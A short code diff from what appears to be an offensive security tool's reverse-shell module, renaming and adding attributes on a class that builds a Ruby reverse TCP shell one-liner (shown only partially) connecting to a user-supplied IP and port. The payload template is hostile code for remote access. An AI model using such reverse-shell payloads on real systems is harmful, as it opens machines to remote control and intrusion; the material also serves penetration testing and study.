@@ -20,7 +20,9 @@ class ReverseTCP(plugin.ReverseShell):
         # )
         self.opts.description = "[ReverseShell][TCP] Ruby from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
-        self.shell_type = "tcp"
+        self.protocol = "tcp"
+        self.shell_type = 1
+        self.is_interactive = True
 
     def make_shell(self):
         self.shell = f"""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{self.args.ip}","{self.args.port}");"""
